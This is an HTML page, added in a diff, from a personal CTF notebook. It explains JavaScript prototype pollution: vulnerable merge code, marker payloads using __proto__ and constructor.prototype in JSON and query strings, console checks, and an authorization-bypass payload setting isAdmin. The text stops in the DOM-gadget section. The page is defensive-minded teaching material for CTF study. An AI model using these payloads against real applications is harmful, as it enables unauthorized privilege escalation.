@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="JavaScript prototype pollution Pollution source → inherited property proof → reachable gadget → visible effect. An object containing a key named __proto__ is not by itself proof that any prototype changed.
+1. Where to look Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for merge, defaultsDeep, set, parse, Object.assign and recursive property copying. Inspect dependency versions when source is provided.
+Vulnerable shape to recognize:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/prototype-pollution/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="Prototype Pollution · Source to Gadget">
+  <meta property="og:description" content="JavaScript prototype pollution Pollution source → inherited property proof → reachable gadget → visible effect. An object containing a key named __proto__ is not by itself proof that any prototype changed.
+1. Where to look Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for merge, defaultsDeep, set, parse, Object.assign and recursive property copying. Inspect dependency versions when source is provided.
+Vulnerable shape to recognize:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="Prototype Pollution · Source to Gadget">
+  <meta itemprop="description" content="JavaScript prototype pollution Pollution source → inherited property proof → reachable gadget → visible effect. An object containing a key named __proto__ is not by itself proof that any prototype changed.
+1. Where to look Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for merge, defaultsDeep, set, parse, Object.assign and recursive property copying. Inspect dependency versions when source is provided.
+Vulnerable shape to recognize:">
+  <meta itemprop="wordCount" content="785">
+
+<title>Prototype Pollution · Source to Gadget • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/prototype-pollution/">
+<link rel="stylesheet" href="/book.min.7886b6a45be989e541bea3447ffdf8cfa4eab5872c00b33d9895c3fe20798996.css" integrity="sha256-eIa2pFvpieVBvqNEf/34z6TqtYcsALM9mJXD/iB5iZY=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="" >01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="" >07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="" >SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="" >XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="active" aria-current="page">Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="" >XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Prototype Pollution · Source to Gadget</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-where-to-look">1. Where to look</a></li>
+    <li><a href="#2-non-destructive-marker-first">2. Non-destructive marker first</a></li>
+    <li><a href="#3-client-side-proof">3. Client-side proof</a></li>
+    <li><a href="#4-server-side-proof-needs-observable-application-behavior">4. Server-side proof needs observable application behavior</a></li>
+    <li><a href="#5-authorization-gadget">5. Authorization gadget</a></li>
+    <li><a href="#6-client-dom-gadget">6. Client DOM gadget</a></li>
+    <li><a href="#7-server-execution-chains-are-runtime-specific">7. Server execution chains are runtime-specific</a></li>
+    <li><a href="#8-troubleshooting">8. Troubleshooting</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>4 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="javascript-prototype-pollution">JavaScript prototype pollution<a class="anchor" href="#javascript-prototype-pollution"></a></h1>
+<p><strong>Pollution source → inherited property proof → reachable gadget → visible effect.</strong> An object containing a key named <code>__proto__</code> is not by itself proof that any prototype changed.</p>
+<h2 id="1-where-to-look">1. Where to look<a class="anchor" href="#1-where-to-look"></a></h2>
+<p>Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for <code>merge</code>, <code>defaultsDeep</code>, <code>set</code>, <code>parse</code>, <code>Object.assign</code> and recursive property copying. Inspect dependency versions when source is provided.</p>
+<p>Vulnerable shape to recognize:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">for</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">const</span> key <span style="color:#81a1c1;font-weight:bold">in</span> input<span style="color:#eceff4">)</span> <span style="color:#eceff4">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">typeof</span> input<span style="color:#eceff4">[</span>key<span style="color:#eceff4">]</span> <span style="color:#81a1c1">===</span> <span style="color:#a3be8c">&#39;object&#39;</span><span style="color:#eceff4">)</span> merge<span style="color:#eceff4">(</span>target<span style="color:#eceff4">[</span>key<span style="color:#eceff4">],</span> input<span style="color:#eceff4">[</span>key<span style="color:#eceff4">]);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1;font-weight:bold">else</span> target<span style="color:#eceff4">[</span>key<span style="color:#eceff4">]</span> <span style="color:#81a1c1">=</span> input<span style="color:#eceff4">[</span>key<span style="color:#eceff4">];</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span></span></span></code></pre></div><p>Exact behavior depends on initialization, own-property checks and recursion. Some merges affect only one object&rsquo;s prototype; others reach the shared <code>Object.prototype</code>.</p>
+<h2 id="2-non-destructive-marker-first">2. Non-destructive marker first<a class="anchor" href="#2-non-destructive-marker-first"></a></h2>
+<p>JSON import/merge candidate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#88c0d0">POST</span> <span style="color:#8fbcbb">/api/settings</span> <span style="color:#81a1c1;font-weight:bold">HTTP</span><span style="color:#81a1c1">/</span><span style="color:#b48ead">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#81a1c1">:</span> ctf.invalid
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#81a1c1">:</span> application/json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">{</span><span style="color:#81a1c1">&#34;__proto__&#34;</span><span style="color:#eceff4">:{</span><span style="color:#81a1c1">&#34;ctfMarker731&#34;</span><span style="color:#eceff4">:</span><span style="color:#a3be8c">&#34;present&#34;</span><span style="color:#eceff4">}}</span></span></span></code></pre></div><p>Alternative path for a setter/merge that permits constructor traversal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#eceff4">{</span><span style="color:#81a1c1">&#34;constructor&#34;</span><span style="color:#eceff4">:{</span><span style="color:#81a1c1">&#34;prototype&#34;</span><span style="color:#eceff4">:{</span><span style="color:#81a1c1">&#34;ctfMarker731&#34;</span><span style="color:#eceff4">:</span><span style="color:#a3be8c">&#34;present&#34;</span><span style="color:#eceff4">}}}</span></span></span></code></pre></div><p>Query parser candidates, only if the parser accepts nested paths:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?__proto__[ctfMarker731]=present
+</span></span><span style="display:flex;"><span>?__proto__.ctfMarker731=present
+</span></span><span style="display:flex;"><span>?constructor[prototype][ctfMarker731]=present
+</span></span><span style="display:flex;"><span>?constructor.prototype.ctfMarker731=present</span></span></code></pre></div><p>These are different parser dialects. URL encode the brackets if transport requires it; do not assume dotted names are nested when the app uses a flat parser.</p>
+<h2 id="3-client-side-proof">3. Client-side proof<a class="anchor" href="#3-client-side-proof"></a></h2>
+<p>After triggering the application&rsquo;s vulnerable operation, inspect from the same page&rsquo;s console:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#eceff4">({}).</span>ctfMarker731
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Object</span><span style="color:#eceff4">.</span>prototype<span style="color:#eceff4">.</span>hasOwnProperty<span style="color:#eceff4">.</span>call<span style="color:#eceff4">({},</span> <span style="color:#a3be8c">&#39;ctfMarker731&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Object</span><span style="color:#eceff4">.</span>prototype<span style="color:#eceff4">.</span>hasOwnProperty<span style="color:#eceff4">.</span>call<span style="color:#eceff4">(</span><span style="color:#81a1c1">Object</span><span style="color:#eceff4">.</span>prototype<span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;ctfMarker731&#39;</span><span style="color:#eceff4">)</span></span></span></code></pre></div><p>Expected for shared prototype pollution: <code>&quot;present&quot;</code>, <code>false</code>, <code>true</code>. A fresh ordinary object inherits the marker without owning it. If only the imported object has the key as its own property, that is data storage, not shared prototype pollution.</p>
+<p>JavaScript literal trap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">const</span> a <span style="color:#81a1c1">=</span> <span style="color:#eceff4">{</span><span style="color:#a3be8c">&#34;__proto__&#34;</span><span style="color:#81a1c1">:</span> <span style="color:#eceff4">{</span>ctfMarker731<span style="color:#81a1c1">:</span><span style="color:#a3be8c">&#39;present&#39;</span><span style="color:#eceff4">}};</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">const</span> b <span style="color:#81a1c1">=</span> JSON<span style="color:#eceff4">.</span>parse<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;{&#34;__proto__&#34;:{&#34;ctfMarker731&#34;:&#34;present&#34;}}&#39;</span><span style="color:#eceff4">);</span></span></span></code></pre></div><p>Object-literal <code>__proto__</code> syntax can set <strong>a&rsquo;s</strong> prototype directly. JSON parsing creates an ordinary own key; dangerous merging later may invoke prototype behavior. Neither statement alone pollutes all ordinary objects. Modern object spread and <code>Object.assign</code> also differ in setter behavior.</p>
+<h2 id="4-server-side-proof-needs-observable-application-behavior">4. Server-side proof needs observable application behavior<a class="anchor" href="#4-server-side-proof-needs-observable-application-behavior"></a></h2>
+<p>Your browser&rsquo;s <code>({}).ctfMarker731</code> cannot inspect a Node server&rsquo;s prototype. Use source-assisted inspection or an endpoint returning properties derived from a <strong>fresh server-created object</strong>. A response echoing your submitted JSON is insufficient.</p>
+<p>In a supplied local source tree, check in a debugger after the merge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#eceff4">({}).</span>ctfMarker731</span></span></code></pre></div><p>Without source, first identify a read of an inherited property that affects a harmless observable value. Avoid global destructive probes such as replacing <code>toString</code>, huge JSON indentation, invalid status codes or memory-consuming keys: process-wide state may persist across users and requests.</p>
+<h2 id="5-authorization-gadget">5. Authorization gadget<a class="anchor" href="#5-authorization-gadget"></a></h2>
+<p>A vulnerable authorization read might look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span>user<span style="color:#eceff4">.</span>isAdmin<span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">return</span> flag<span style="color:#eceff4">;</span></span></span></code></pre></div><p>Candidate only after a pollution source is proven:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#eceff4">{</span><span style="color:#81a1c1">&#34;__proto__&#34;</span><span style="color:#eceff4">:{</span><span style="color:#81a1c1">&#34;isAdmin&#34;</span><span style="color:#eceff4">:</span><span style="color:#81a1c1;font-weight:bold">true</span><span style="color:#eceff4">}}</span></span></span></code></pre></div><p>Then request the protected resource in the same server instance/session. This fails if <code>user</code> has its own <code>isAdmin:false</code>, uses a null prototype, or the code checks an own property / database role. Own properties shadow inherited values. A JSON response showing <code>isAdmin:true</code> does not prove the authorization decision changed.</p>
+<h2 id="6-client-dom-gadget">6. Client DOM gadget<a class="anchor" href="#6-client-dom-gadget"></a></h2>
+<p>Example source to recognize:</p>
